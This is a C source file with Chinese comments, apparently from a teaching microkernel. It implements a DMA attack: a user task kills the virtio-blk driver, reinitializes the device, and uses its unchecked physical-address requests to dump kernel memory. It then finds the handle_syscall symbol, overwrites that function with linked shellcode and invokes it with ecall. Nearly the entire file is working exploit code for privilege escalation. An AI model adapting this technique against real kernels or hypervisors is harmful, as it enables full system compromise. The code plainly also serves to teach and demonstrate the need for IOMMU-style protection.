#include <libs/common/backtrace.h>
#include <libs/common/print.h>
#include <libs/common/string.h>
#include <libs/user/driver.h>
#include <libs/user/ipc.h>
#include <libs/user/malloc.h>
#include <libs/user/syscall.h>
#include <libs/user/virtio/virtio_mmio.h>
#include <servers/virtio_blk/virtio_blk.h>

#define KERNEL_BASE         0x80000000
#define REQUEST_HEADER_SIZE (sizeof(uint32_t) * 2 + sizeof(uint64_t))

static struct virtio_mmio device;
static struct virtio_virtq *requestq;

//存储对 virtio-blk 的请求的区域。第一个 PAGE_SIZE -REQUEST_HEADER_SIZE
//数据，并使用剩余的 REQUEST_HEADER_SIZE 作为请求头。
static paddr_t request_paddr;
static uintptr_t request_uaddr;

//shellcode.S 的内容（由 llvm-objcopy -O 二进制文件生成的符号）
extern char _binary_shellcode_bin_start[];
extern char _binary_shellcode_bin_size[];

//读写磁盘。 data_paddr表示数据读或写源。
//指定物理地址。
static void readwrite(uint64_t sector, paddr_t data_paddr, size_t len,
                      bool is_write) {
    ASSERT(len + REQUEST_HEADER_SIZE + 1 < PAGE_SIZE);
    ASSERT(IS_ALIGNED(len, SECTOR_SIZE));

    uaddr_t header_paddr = request_paddr + len;
    uaddr_t status_paddr = request_paddr + len + REQUEST_HEADER_SIZE;
    uaddr_t header_uaddr = request_uaddr + len;
    struct virtio_blk_req *req = (struct virtio_blk_req *) header_uaddr;
    req->type = is_write ? VIRTIO_BLK_T_OUT : VIRTIO_BLK_T_IN;
    req->reserved = 0;
    req->sector = sector;

    struct virtio_chain_entry chain[3];
    chain[0].addr = header_paddr;
    chain[0].len = REQUEST_HEADER_SIZE;
    chain[0].device_writable = false;

    chain[1].addr = data_paddr;//它工作得很好，因为没有人检查它是否是内核内存
    chain[1].len = len;
    chain[1].device_writable = !is_write;

    chain[2].addr = status_paddr;
    chain[2].len = sizeof(uint8_t);
    chain[2].device_writable = true;

    ASSERT_OK(virtq_push(requestq, chain, 3));
    virtq_notify(&device, requestq);

    //等待该过程完成。
    uint8_t status;
    do {
        status = virtio_read_interrupt_status(&device);
    } while ((status & 1) == 0);

    virtio_ack_interrupt(&device, status & 0b11);
}

static void read_memory(paddr_t src, char *buf, size_t len) {
    ASSERT(IS_ALIGNED(len, SECTOR_SIZE));

    //将src的内容写入磁盘（0扇区）
    readwrite(0, src, len, true);

    //将已写入磁盘（0扇区）的内容读入buf
    readwrite(0, request_paddr, len, false);
    memcpy(buf, (uint8_t *) request_uaddr, len);
}

static void write_to_memory(paddr_t dest, char *buf, size_t len) {
    ASSERT(IS_ALIGNED(len, SECTOR_SIZE));

    //将buf的内容写入磁盘（0扇区）
    memcpy((uint8_t *) request_uaddr, buf, len);
    readwrite(0, request_paddr, len, true);

    //将写入的磁盘内容（0扇区）读取到dest
    readwrite(0, dest, len, false);
}

void main(void) {
    //删除 Virtio blk 设备驱动程序服务器，然后重新初始化设备。
    INFO("waiting for virtio_blk driver to finish its initialization...");
    task_t blk_device = ipc_lookup("blk_device");
    ASSERT_OK(blk_device);

    INFO("killing virtio_blk driver to remap the virtio...");
    struct message m;
    m.type = DESTROY_TASK_MSG;
    m.destroy_task.task = blk_device;
    ASSERT_OK(ipc_call(VM_SERVER, &m));

    INFO("reinitializing virtio_blk...");
    paddr_t base_paddr = VIRTIO_BLK_PADDR;
    ASSERT_OK(virtio_init(&device, base_paddr, 1));
    ASSERT_OK(virtio_negotiate_feature(&device, 0));
    requestq = virtq_get(&device, 0);
    ASSERT_OK(virtio_enable(&device));
    ASSERT_OK(driver_alloc_pages(PAGE_SIZE, PAGE_READABLE | PAGE_WRITABLE,
                                 &request_uaddr, &request_paddr));

    //将内核内存提取到 buf。 4 mi b 应该足够了。
    INFO("dumping kernel memory...");
    static char buf[4 * 1024 * 1024];//添加static来静态分配
    for (offset_t off = 0; off < sizeof(buf); off += SECTOR_SIZE) {
        read_memory(KERNEL_BASE + off, &buf[off], SECTOR_SIZE);
    }

    TRACE("first 128 bytes of the kernel memory at %p:", KERNEL_BASE);
    HEXDUMP(buf, 128);

    //查找符号表。
    INFO("looking for the symbol table...");
    struct symbol_table *table = NULL;
    for (offset_t off = 0; off < sizeof(buf); off += 4) {
        uint32_t *p = (uint32_t *) &buf[off];
        if (*p == SYMBOL_TABLE_MAGIC) {
            table = (struct symbol_table *) p;
            break;
        }
    }

    if (!table) {
        PANIC("symbol table not found");
    }

    //在符号表中查找 Handle 系统调用函数的地址。
    paddr_t table_paddr = KERNEL_BASE + (offset_t) ((char *) table - buf);
    INFO("found the symbol table at 0x%p", table_paddr);
    INFO("looking for the symbol of handle_syscall...");
    struct symbol *sym = NULL;
    for (size_t i = 0; i < table->num_symbols; i++) {
        if (strcmp(table->symbols[i].name, "handle_syscall") == 0) {
            sym = &table->symbols[i];
            break;
        }
    }

    if (!sym) {
        PANIC("handle_syscall not found");
    }

    INFO("found handle_syscall at 0x%p", sym->addr);
    offset_t off = sym->addr - KERNEL_BASE;
    ASSERT(off < sizeof(buf));

    //将 Shellcode.s 的内容复制到 buf 中句柄系统调用函数的位置。
    INFO("overwriting handle_syscall with the shellcode...");
    char *shellcode = _binary_shellcode_bin_start;
    size_t shellcode_size = (size_t) _binary_shellcode_bin_size;
    memcpy(&buf[off], shellcode, shellcode_size);
    paddr_t dest = (sym->addr / SECTOR_SIZE) * SECTOR_SIZE;
    size_t len = ALIGN_UP(off + shellcode_size, SECTOR_SIZE)
                 - ALIGN_DOWN(off, SECTOR_SIZE);

    //用shellcode.S覆盖handle_syscall函数。系统调用直到覆盖完成
//注意不要误调用它（例如INFO宏）。
    write_to_memory(dest, &buf[dest - KERNEL_BASE], len);

    //现在一切准备就绪，调用系统调用处理程序。 shellcode.s 应该被执行。
    __asm__ __volatile__("ecall");
}
